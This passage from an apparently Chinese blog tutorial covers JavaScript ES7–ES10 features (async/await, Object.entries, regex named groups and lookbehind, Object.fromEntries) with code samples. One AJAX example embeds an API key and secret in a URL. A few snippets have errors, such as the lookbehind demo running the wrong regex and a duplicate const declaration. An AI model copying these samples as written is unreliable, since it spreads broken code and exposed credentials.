class="string">&quot;./src/js/m3.js&quot;</span>;</span><br><span class="line">m3.<span class="title function_">change</span>()</span><br></pre></td></tr></table></figure><h3 id="babel对ES6模块化代码的转换"><a href="#babel对ES6模块化代码的转换" class="headerlink" title="babel对ES6模块化代码的转换"></a>babel对ES6模块化代码的转换</h3><ul><li><ol><li>安装工具 npm i babel-cli(babel命令行工具) babel-preset-env(预设包) browserify（打包工具）(webpack) -D</li></ol></li><li><ol start="2"><li>编译 npx babel src/js -d dist/js –presets=babel-preset-env</li></ol></li><li><ol start="3"><li>打包 npx browserify dist/js/app.js -o dist/bundle.js</li></ol></li><li><ol start="4"><li>引入dist/bundle.js文件就可以src/js中文件的内容</li></ol></li></ul><hr><h1 id="ES7"><a href="#ES7" class="headerlink" title="ES7"></a>ES7</h1><h2 id="Array-prototype-includes"><a href="#Array-prototype-includes" class="headerlink" title="Array.prototype.includes"></a>Array.prototype.includes</h2><ul><li>includes 方法用来检测数组中是否包含某个元素，返回布尔类型值</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// includes</span></span><br><span class="line"><span class="keyword">const</span> mingzhu = [<span class="string">&#x27;西游记&#x27;</span>,<span class="string">&#x27;红楼梦&#x27;</span>,<span class="string">&#x27;三国演义&#x27;</span>,<span class="string">&#x27;水浒传&#x27;</span>];</span><br><span class="line"><span class="comment">//判断</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mingzhu.<span class="title function_">includes</span>(<span class="string">&#x27;西游记&#x27;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mingzhu.<span class="title function_">includes</span>(<span class="string">&#x27;金瓶梅&#x27;</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="comment">// indexOf判断如果有返回结果是下标，反之返回-1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mingzhu.<span class="title function_">indexOf</span>(<span class="string">&#x27;红楼梦&#x27;</span>)) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h2 id="指数操作符"><a href="#指数操作符" class="headerlink" title="指数操作符"></a>指数操作符</h2><ul><li>指数运算符「**」，用来实现幂运算，功能与 Math.pow 结果相同</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span> ** <span class="number">3</span>);<span class="comment">// 8</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 8</span></span><br></pre></td></tr></table></figure><hr><h1 id="ES8"><a href="#ES8" class="headerlink" title="ES8"></a>ES8</h1><h2 id="async-和-await"><a href="#async-和-await" class="headerlink" title="async 和 await"></a>async 和 await</h2><p><strong>async 和 await 两种语法结合可以让<code>异步代码</code>像<code>同步代码</code>一样</strong></p><h3 id="async-函数"><a href="#async-函数" class="headerlink" title="async 函数"></a>async 函数</h3><ul><li>async 函数的返回值为 promise 对象，<ul><li>如果return直接返回字符串、数组等【不是Promise 类型的对象】, 那么返回的结果就是成功 Promise 对象</li><li>如果抛出错误, 返回的结果是一个失败的 Promise</li><li>返回的结果如果是一个 Promise 对象，promise 对象的结果由 async 函数执行的返回值决定</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//async 函数</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 返回一个字符串</span></span><br><span class="line">  <span class="comment">// return &#x27;尚硅谷&#x27;;</span></span><br><span class="line">  <span class="comment">// 返回的结果不是一个 Promise 类型的对象, 返回的结果就是成功 Promise 对象</span></span><br><span class="line">  <span class="comment">// return;</span></span><br><span class="line">  <span class="comment">//抛出错误, 返回的结果是一个失败的 Promise</span></span><br><span class="line">  <span class="comment">// throw new Error(&#x27;出错啦!&#x27;);</span></span><br><span class="line">  <span class="comment">//返回的结果如果是一个 Promise 对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;成功的数据&#x27;</span>);</span><br><span class="line">    <span class="comment">// reject(&quot;失败的错误&quot;);</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = <span class="title function_">fn</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 then 方法</span></span><br><span class="line">result.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="await-表达式"><a href="#await-表达式" class="headerlink" title="await 表达式"></a>await 表达式</h3><ul><li>await 必须写在 async 函数中</li><li>await 右侧的表达式一般为 promise 对象 </li><li>await 返回的是 promise 成功的值 </li><li>await 的 promise 失败了, 就会抛出异常, 需要通过 try…catch 捕获处理</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建 promise 对象</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// resolve(&quot;用户数据&quot;);</span></span><br><span class="line">  <span class="title function_">reject</span>(<span class="string">&quot;失败啦!&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// await 要放在 async 函数中.</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 成功</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="keyword">await</span> p;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="comment">// 失败</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><h3 id="async和await结合实例"><a href="#async和await结合实例" class="headerlink" title="async和await结合实例"></a>async和await结合实例</h3><ul><li>读取文件中的内容</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 引入 fs 模块</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取『为学』</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readWeiXue</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&quot;./resources/为学.md&quot;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//如果失败</span></span><br><span class="line">            <span class="keyword">if</span> (err) <span class="title function_">reject</span>(err);</span><br><span class="line">            <span class="comment">//如果成功</span></span><br><span class="line">            <span class="title function_">resolve</span>(data);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readChaYangShi</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&quot;./resources/插秧诗.md&quot;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//如果失败</span></span><br><span class="line">            <span class="keyword">if</span> (err) <span class="title function_">reject</span>(err);</span><br><span class="line">            <span class="comment">//如果成功</span></span><br><span class="line">            <span class="title function_">resolve</span>(data);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readGuanShu</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&quot;./resources/观书有感.md&quot;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//如果失败</span></span><br><span class="line">            <span class="keyword">if</span> (err) <span class="title function_">reject</span>(err);</span><br><span class="line">            <span class="comment">//如果成功</span></span><br><span class="line">            <span class="title function_">resolve</span>(data);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一个 async 函数</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//获取为学内容</span></span><br><span class="line">    <span class="keyword">let</span> weixue = <span class="keyword">await</span> <span class="title function_">readWeiXue</span>();</span><br><span class="line">    <span class="comment">//获取插秧诗内容</span></span><br><span class="line">    <span class="keyword">let</span> chayang = <span class="keyword">await</span> <span class="title function_">readChaYangShi</span>();</span><br><span class="line">    <span class="comment">// 获取观书有感</span></span><br><span class="line">    <span class="keyword">let</span> guanshu = <span class="keyword">await</span> <span class="title function_">readGuanShu</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(weixue.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(chayang.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(guanshu.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><ul><li>发送 AJAX 请求</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 发送 AJAX 请求, 返回的结果是 Promise 对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendAJAX</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//1. 创建对象</span></span><br><span class="line">    <span class="keyword">const</span> x = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 初始化</span></span><br><span class="line">    x.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. 发送</span></span><br><span class="line">    x.<span class="title function_">send</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4. 事件绑定</span></span><br><span class="line">    x.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; x.<span class="property">status</span> &lt; <span class="number">300</span>) &#123;</span><br><span class="line">          <span class="comment">//成功啦</span></span><br><span class="line">          <span class="title function_">resolve</span>(x.<span class="property">response</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="comment">//如果失败</span></span><br><span class="line">          <span class="title function_">reject</span>(x.<span class="property">status</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//promise then 方法测试</span></span><br><span class="line"><span class="comment">// sendAJAX(&quot;https://api.apiopen.top/getJoke&quot;).then(value=&gt;&#123;</span></span><br><span class="line"><span class="comment">//     console.log(value);</span></span><br><span class="line"><span class="comment">// &#125;, reason=&gt;&#123;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// async 与 await 测试  axios</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">//发送 AJAX 请求</span></span><br><span class="line">  <span class="keyword">let</span> result = <span class="keyword">await</span> <span class="title function_">sendAJAX</span>(<span class="string">&quot;https://api.apiopen.top/getJoke&quot;</span>);</span><br><span class="line">  <span class="comment">//再次测试</span></span><br><span class="line">  <span class="keyword">let</span> tianqi = <span class="keyword">await</span> <span class="title function_">sendAJAX</span>(<span class="string">&#x27;https://www.tianqiapi.com/api/?version=v1&amp;city=%E5%8C%97%E4%BA%AC&amp;appid=23941491&amp;appsecret=TXoD5e8P&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(tianqi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><hr><h2 id="对象方法扩展"><a href="#对象方法扩展" class="headerlink" title="对象方法扩展"></a>对象方法扩展</h2><h3 id="Object-values-和-Object-entries"><a href="#Object-values-和-Object-entries" class="headerlink" title="Object.values 和 Object.entries"></a>Object.values 和 Object.entries</h3><ul><li>Object.values()方法返回一个给定对象的所有可枚举属性值的数组</li><li>Object.entries()方法返回一个给定对象自身可遍历属性 [key,value] 的数组</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明对象</span></span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;尚硅谷&quot;</span>,</span><br><span class="line">  <span class="attr">cities</span>:[<span class="string">&#x27;北京&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>,<span class="string">&#x27;深圳&#x27;</span>],</span><br><span class="line">  <span class="attr">xueke</span>: [<span class="string">&#x27;前端&#x27;</span>,<span class="string">&#x27;Java&#x27;</span>,<span class="string">&#x27;大数据&#x27;</span>,<span class="string">&#x27;运维&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//获取对象所有的键</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(school)); <span class="comment">// [&#x27;name&#x27;, &#x27;cities&#x27;, &#x27;xueke&#x27;]</span></span><br><span class="line"><span class="comment">//获取对象所有的值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">values</span>(school)); [<span class="string">&#x27;尚硅谷&#x27;</span>, [<span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;上海&#x27;</span>, <span class="string">&#x27;深圳&#x27;</span>], [<span class="string">&#x27;前端&#x27;</span>,<span class="string">&#x27;Java&#x27;</span>,<span class="string">&#x27;大数据&#x27;</span>,<span class="string">&#x27;运维&#x27;</span>]]</span><br><span class="line"><span class="comment">//entries</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">entries</span>(school)); [[<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;尚硅谷&#x27;</span>], [<span class="string">&#x27;cities&#x27;</span>, [<span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;上海&#x27;</span>, <span class="string">&#x27;深圳&#x27;</span>]], [<span class="string">&#x27;xueke&#x27;</span>, [<span class="string">&#x27;前端&#x27;</span>,<span class="string">&#x27;Java&#x27;</span>,<span class="string">&#x27;大数据&#x27;</span>,<span class="string">&#x27;运维&#x27;</span>]]]</span><br><span class="line"><span class="comment">//创建 Map</span></span><br><span class="line"><span class="keyword">const</span> m = <span class="keyword">new</span> <span class="title class_">Map</span>(<span class="title class_">Object</span>.<span class="title function_">entries</span>(school));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">get</span>(<span class="string">&#x27;cities&#x27;</span>)); <span class="comment">// [&#x27;北京&#x27;, &#x27;上海&#x27;, &#x27;深圳&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="Object-getOwnPropertyDescriptors"><a href="#Object-getOwnPropertyDescriptors" class="headerlink" title="Object.getOwnPropertyDescriptors"></a>Object.getOwnPropertyDescriptors</h3><ul><li>该方法返回指定对象所有自身属性的描述对象</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明对象</span></span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;尚硅谷&quot;</span>,</span><br><span class="line">  <span class="attr">cities</span>:[<span class="string">&#x27;北京&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>,<span class="string">&#x27;深圳&#x27;</span>],</span><br><span class="line">  <span class="attr">xueke</span>: [<span class="string">&#x27;前端&#x27;</span>,<span class="string">&#x27;Java&#x27;</span>,<span class="string">&#x27;大数据&#x27;</span>,<span class="string">&#x27;运维&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptors</span>(school));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">  <span class="attr">name</span>: &#123;</span><br><span class="line">    <span class="comment">//设置值</span></span><br><span class="line">    <span class="attr">value</span>: <span class="string">&#x27;尚硅谷&#x27;</span>,</span><br><span class="line">    <span class="comment">//属性特性</span></span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">true</span>, <span class="comment">// 是否可写</span></span><br><span class="line">    <span class="attr">configurable</span>: <span class="literal">true</span>, <span class="comment">// 是否可删</span></span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">true</span> <span class="comment">// 是否可枚举</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><h1 id="ES9"><a href="#ES9" class="headerlink" title="ES9"></a>ES9</h1><h2 id="Rest-Spread-属性"><a href="#Rest-Spread-属性" class="headerlink" title="Rest/Spread 属性"></a>Rest/Spread 属性</h2><p><strong>Rest 参数与 spread 扩展运算符在 ES6 中已经引入，不过 <code>ES6</code> 中只针对于<code>数组</code>，在 <code>ES9</code> 中为<code>对象</code>提供了像数组一样的 <code>rest 参数</code>和<code>扩展运算符</code></strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//rest 参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">connect</span>(<span class="params">&#123;host, port, ...user&#125;</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(host);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(port);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">connect</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="number">3306</span>,</span><br><span class="line">  <span class="attr">username</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&#x27;master&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//对象合并</span></span><br><span class="line"><span class="keyword">const</span> skillOne = &#123;</span><br><span class="line">  <span class="attr">q</span>: <span class="string">&#x27;天音波&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> skillTwo = &#123;</span><br><span class="line">  <span class="attr">w</span>: <span class="string">&#x27;金钟罩&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> skillThree = &#123;</span><br><span class="line">  <span class="attr">e</span>: <span class="string">&#x27;天雷破&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> skillFour = &#123;</span><br><span class="line">  <span class="attr">r</span>: <span class="string">&#x27;猛龙摆尾&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...skillOne   =&gt;  q: &#x27;天音波&#x27;, w: &#x27;金钟罩&#x27;</span></span><br><span class="line"><span class="keyword">const</span> mangseng = &#123;...skillOne, ...skillTwo, ...skillThree, ...skillFour&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mangseng)</span><br></pre></td></tr></table></figure><hr><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="式命名捕获组"><a href="#式命名捕获组" class="headerlink" title="式命名捕获组"></a>式命名捕获组</h3><p><strong>ES9 允许命名捕获组使用符号<code>『?&lt;name&gt;』</code>,这样获取捕获结果可读性更强</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明一个字符串</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;&lt;a href=&quot;http://www.atguigu.com&quot;&gt;尚硅谷&lt;/a&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提取 url 与 『标签文本』</span></span><br><span class="line"><span class="keyword">const</span> reg = <span class="regexp">/&lt;a href=&quot;(.*)&quot;&gt;(.*)&lt;\/a&gt;/</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行</span></span><br><span class="line"><span class="keyword">const</span> result = reg.<span class="title function_">exec</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result[<span class="number">0</span>]); <span class="comment">// &lt;a href=&quot;http://www.atguigu.com&quot;&gt;尚硅谷&lt;/a&gt;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result[<span class="number">1</span>]); <span class="comment">// http://www.atguigu.com</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result[<span class="number">2</span>]); <span class="comment">// 尚硅谷</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str1 = <span class="string">&#x27;&lt;a href=&quot;http://www.atguigu.com&quot;&gt;尚硅谷&lt;/a&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//分组命名,返回的数据会多一个groups</span></span><br><span class="line"><span class="keyword">const</span> reg = <span class="regexp">/&lt;a href=&quot;(?&lt;url&gt;.*)&quot;&gt;(?&lt;text&gt;.*)&lt;\/a&gt;/</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = reg.<span class="title function_">exec</span>(str1);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">groups</span>.<span class="property">url</span>); <span class="comment">// http://www.atguigu.com</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">groups</span>.<span class="property">text</span>); <span class="comment">// 尚硅谷</span></span><br></pre></td></tr></table></figure><h3 id="反向断言"><a href="#反向断言" class="headerlink" title="反向断言"></a>反向断言</h3><p><strong>ES9 支持反向断言，通过对匹配结果前面的内容进行判断，对匹配进行筛选。</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 提取字符串的555</span></span><br><span class="line"><span class="comment">//声明字符串</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;JS5211314你知道么555啦啦啦&#x27;</span>;</span><br><span class="line"><span class="comment">//正向断言</span></span><br><span class="line"><span class="keyword">const</span> reg = <span class="regexp">/\d+(?=啦)/</span>;</span><br><span class="line"><span class="keyword">const</span> result = reg.<span class="title function_">exec</span>(str);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result[<span class="number">0</span>]); <span class="comment">// 555</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//反向断言</span></span><br><span class="line"><span class="keyword">const</span> reg1 = <span class="regexp">/(?&lt;=么)\d+/</span>;</span><br><span class="line"><span class="keyword">const</span> result1 = reg.<span class="title function_">exec</span>(str);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result1[<span class="number">0</span>]); <span class="comment">// 555</span></span><br></pre></td></tr></table></figure><h3 id="dotAll-模式"><a href="#dotAll-模式" class="headerlink" title="dotAll 模式"></a>dotAll 模式</h3><p><strong>正则表达式中点<code>.</code>匹配除回车外的<code>任何单字符</code>，标记<code>『s』</code>改变这种行为，允许<code>行终止符</code>出现</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ul标签中的电影名称和上映日期提取出来存到一个对象中</span></span><br><span class="line"><span class="comment">//dot  .  元字符  除换行符以外的任意单个字符</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;ul&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;</span></span><br><span class="line"><span class="string">                &lt;a&gt;肖生克的救赎&lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;上映日期: 1994-09-10&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;</span></span><br><span class="line"><span class="string">                &lt;a&gt;阿甘正传&lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;上映日期: 1994-07-06&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;`</span>;</span><br><span class="line"><span class="comment">//声明正则</span></span><br><span class="line"><span class="comment">// const reg = /&lt;li&gt;\s+&lt;a&gt;(.*?)&lt;\/a&gt;\s+&lt;p&gt;(.*?)&lt;\/p&gt;/;</span></span><br><span class="line"><span class="keyword">const</span> reg = <span class="regexp">/&lt;li&gt;.*?&lt;a&gt;(.*?)&lt;\/a&gt;.*?&lt;p&gt;(.*?)&lt;\/p&gt;/g</span>s;</span><br><span class="line"><span class="comment">//执行匹配</span></span><br><span class="line"><span class="comment">// const result = reg.exec(str);</span></span><br><span class="line"><span class="keyword">let</span> result;</span><br><span class="line"><span class="keyword">let</span> data = [];</span><br><span class="line"><span class="keyword">while</span>(result = reg.<span class="title function_">exec</span>(str))&#123;</span><br><span class="line">  data.<span class="title function_">push</span>(&#123;<span class="attr">title</span>: result[<span class="number">1</span>], <span class="attr">time</span>: result[<span class="number">2</span>]&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br></pre></td></tr></table></figure><hr><h1 id="ES10"><a href="#ES10" class="headerlink" title="ES10"></a>ES10</h1><h2 id="Object-fromEntries"><a href="#Object-fromEntries" class="headerlink" title="Object.fromEntries"></a>Object.fromEntries</h2><p><strong>将二维数组转换为对象，与Object.entries互为逆运算</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二维数组</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="title class_">Object</span>.<span class="title function_">fromEntries</span>([</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;尚硅谷&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;xueke&#x27;</span>, <span class="string">&#x27;Java,大数据,前端,云计算&#x27;</span>]</span><br><span class="line">]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result) <span class="comment">// &#123; name: &#x27;尚硅谷&#x27;, xueke: &#x27;Java,大数据,前端,云计算&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Map</span></span><br><span class="line"><span class="keyword">const</span> m = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;ATGUIGU&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> result1 = <span class="title class_">Object</span>.<span class="title function_">fromEntries</span>(m);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result1) <span class="comment">// &#123; name: &quot;ATGUIGU&quot; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Object.entries ES8 将对象转为二维数组</span></span><br><span class="line"><span class="keyword">const</span> arr = <span class="title class_">Object</span>.<span class="title function_">entries</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;尚硅谷&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); [[<span 